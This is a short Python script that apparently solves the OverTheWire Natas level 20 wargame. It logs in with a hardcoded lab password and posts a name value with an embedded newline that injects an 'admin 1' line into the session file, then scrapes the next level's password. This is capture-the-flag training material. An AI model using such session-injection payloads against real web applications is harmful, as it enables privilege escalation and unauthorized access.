import requests
import re

username = "natas20"
password = "slOKYGsjlJhaqKliGvrgWAzln0JyrWao"
url = 'http://%s.natas.labs.overthewire.org/?debug=true' % username


session = requests.session()
session.post(url , auth=(username, password), data= {"name":"jango\nadmin 1"}) # The my read function will loop through and assign jango firstly but right after it, admin will be set to 1 and assigned in place of jango which declares you as the admin.

response = session.get(url, auth=(username,password))

#print(response.text)
print (re.findall("Password: (.*)</pre>",response.text)[0])
